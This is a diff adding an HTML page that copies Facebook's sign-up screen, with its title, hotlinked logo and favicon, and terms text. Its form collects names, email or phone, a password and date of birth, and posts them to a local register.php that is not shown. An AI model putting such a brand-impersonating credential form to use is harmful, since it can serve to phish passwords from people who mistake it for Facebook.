@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - log in or sign up</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+</head>
+<body>
+    <div class="container">
+        <div class="left-side">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook logo" class="logo">
+            <h2>Facebook helps you connect and share with the people in your life.</h2>
+        </div>
+        <div class="right-side">
+            <div class="signup-form">
+                <form id="registrationForm" action="register.php" method="POST">
+                    <input type="text" name="firstname" placeholder="First name" required>
+                    <input type="text" name="lastname" placeholder="Last name" required>
+                    <input type="text" name="email_or_mobile" placeholder="Mobile number or email address" required>
+                    <input type="password" name="password" id="password" placeholder="New password" required>
+                    
+                    <div class="input-info">Date of birth</div>
+                    <div class="dob-selectors">
+                        <select name="day" aria-label="Day" required>
+                            </select>
+                        <select name="month" aria-label="Month" required>
+                            <option value="1">Jan</option>
+                            <option value="2">Feb</option>
+                            <option value="3">Mar</option>
+                            <option value="4">Apr</option>
+                            <option value="5">May</option>
+                            <option value="6">Jun</option>
+                            <option value="7">Jul</option>
+                            <option value="8">Aug</option>
+                            <option value="9">Sep</option>
+                            <option value="10">Oct</option>
+                            <option value="11">Nov</option>
+                            <option value="12">Dec</option>
+                        </select>
+                        <select name="year" aria-label="Year" required>
+                            </select>
+                    </div>
+
+                    <div class="input-info">Gender</div>
+                    <div class="gender-selectors">
+                        <label>
+                            Female
+                            <input type="radio" name="gender" value="female" required>
+                        </label>
+                        <label>
+                            Male
+                            <input type="radio" name="gender" value="male">
+                        </label>
+                        <label>
+                            Custom
+                            <input type="radio" name="gender" value="custom">
+                        </label>
+                    </div>
+
+                    <p class="terms">
+                        People who use our service may have uploaded your contact information to Facebook. <a href="#">Learn more.</a>
+                    </p>
+                    <p class="terms">
+                        By clicking Sign Up, you agree to our <a href="#">Terms</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookies Policy</a>. You may receive SMS notifications from us and can opt out at any time.
+                    </p>
+                    
+                    <button type="submit" class="signup-btn">Sign Up</button>
+                    <div class="login-link">
+                        <a href="#">Already have an account?</a>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
